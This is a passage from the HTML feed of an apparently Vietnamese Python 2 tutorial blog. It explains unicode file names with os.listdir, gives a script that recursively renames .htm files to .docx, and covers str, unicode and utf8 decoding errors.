&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;FExists&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;D:/abc&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;V? mi?n t\xe2y&amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;D:/abc\\V? mi?n t\xe2y&amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FExists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="go"&gt;[False]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thư mục &lt;tt class="docutils literal"&gt;abc&lt;/tt&gt; có chứa duy nhất file &lt;tt class="docutils literal"&gt;Về miền tây&lt;/tt&gt;, tên file là tiếng Việt có dấu, kết quả kiểm tra sự tồn tại cho thấy file không tồn tại. Nguyên nhân là từ hàm &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt;. Nêu đối số của hàm &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt; là unicode các tên file lấy về cũng là unicode, nếu là ascii, các tên file trả về cũng là dạng ascii. Vì vậy tên file trả về của &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt; trong trường hợp này không đúng và bạn không thể thao tác với file đó được. Để lấy đúng tên file trong trường hợp này bạn phải truyền đối số unicode cho hàm &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;D:/abc&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="go"&gt;[u&amp;#39;D:/abc\\V\u1ec1 mi\u1ec1n t\xe2y&amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;FExists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;span class="go"&gt;[True]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Tuy nhiên trên Linux, bạn không gặp vấn đề này.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="bai-tap-vi-du"&gt;
&lt;h2&gt;5. Bài tập ví dụ:&lt;/h2&gt;
&lt;p&gt;Viết chương trình đổi tên tất cả các file trong thư mục &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;c:\data&lt;/span&gt;&lt;/tt&gt; và các thư mục con của nó. Đổi tên các file có phần mở rộng là &lt;tt class="docutils literal"&gt;*.htm&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;*.docx&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Dưới đây là một triển khai của bài tập này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;glob&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; bag là một list chứa các file thỏa mãn quy tắc wildcards &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
        &lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;rename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oldName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newExt&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Thay thế phần mở rộng cũ thành mở rộng mới. Giả thiết oldName luôn có&lt;/span&gt;
&lt;span class="sd"&gt;     phần mở rộng. &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;newName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;oldName&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;oldName&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rfind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;newExt&lt;/span&gt;
    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oldName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;newName&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;WalkAndRename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oldExt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newExt&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;oldExt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newExt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;WalkAndRename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c:&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;htm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;docx&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
</content><category term="listdir"></category><category term="glob"></category><category term="unicode"></category><category term="walk"></category></entry><entry><title>Xử lý tiếng Việt trong Python</title><link href="/2009/06/xu-ly-tieng-viet-trong-python.html" rel="alternate"></link><published>2009-06-13T19:23:00+07:00</published><updated>2009-06-13T19:23:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2009-06-13:/2009/06/xu-ly-tieng-viet-trong-python.html</id><summary type="html">&lt;p&gt;Ví dụ sau minh họa 3 codecs bạn hay gặp nhất trong Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;type &amp;#39;str&amp;#39;&amp;gt; 17&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;thi\xc3\xaan h\xe1\xba\xa1 v\xc3\xb4 \xc4\x91\xe1\xbb\x8bch&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Ví dụ sau minh họa 3 codecs bạn hay gặp nhất trong Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;type &amp;#39;str&amp;#39;&amp;gt; 17&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;thi\xc3\xaan h\xe1\xba\xa1 v\xc3\xb4 \xc4\x91\xe1\xbb\x8bch&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;type &amp;#39;str&amp;#39;&amp;gt; 23&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;thi\xean h\u1ea1 v\xf4 \u0111\u1ecbch&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; 16&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nghiên cứu ví dụ trên. &lt;tt class="docutils literal"&gt;len(s)&lt;/tt&gt; trong hai ví dụ đầu thực sự là số byte cần để lưu trữ &lt;tt class="docutils literal"&gt;s&lt;/tt&gt;. &lt;tt class="docutils literal"&gt;len(s)&lt;/tt&gt; trong ví dụ 3 là độ dài ký tự, dung lượng nhớ thực sự để lưu trữ &lt;tt class="docutils literal"&gt;s&lt;/tt&gt; là 16 * 2 = 32 bytes.&lt;/p&gt;
&lt;p&gt;Tại bất cứ một thời điểm nào trong chương trình Python bạn cũng phải xác định được bạn đang thao tác với chuỗi kiểu gì: ascii, unicode, hay utf8... Dùng lệnh sau để biết một chuỗi là unicode hay không:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;thi\xean h\u1ea1 v\xf4 \u0111\u1ecbch&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cộng một chuỗi không phải unicode với một chuỗi unicode thì chuỗi không phải unicode sẽ được tự động convert sang unicode trước khi cộng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sky down no enemy&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;sky down no enemy&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="gt"&gt;Traceback (most recent call last):&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &lt;span class="n"&gt;&amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="gr"&gt;UnicodeDecodeError&lt;/span&gt;: &lt;span class="n"&gt;&amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xc3 in position 3: ordinal not in range(128)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;u&amp;#39;thi\xean h\u1ea1 v\xf4 \u0111\u1ecbch&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong tình huống thứ 2 bạn cố gắng cộng một chuỗi utf8 vào chuỗi unicode. Python tự động chuyển chuỗi utf8 thành chuỗi unicode bằng cách decode với codec='ascii', vì vậy gặp lỗi. Tình huống này tương đương với:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;ss + u&amp;quot;&amp;quot; = ss.decode(&amp;#39;ascii&amp;#39;) + u&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;thiên hạ vô địch&amp;quot;&lt;/span&gt;
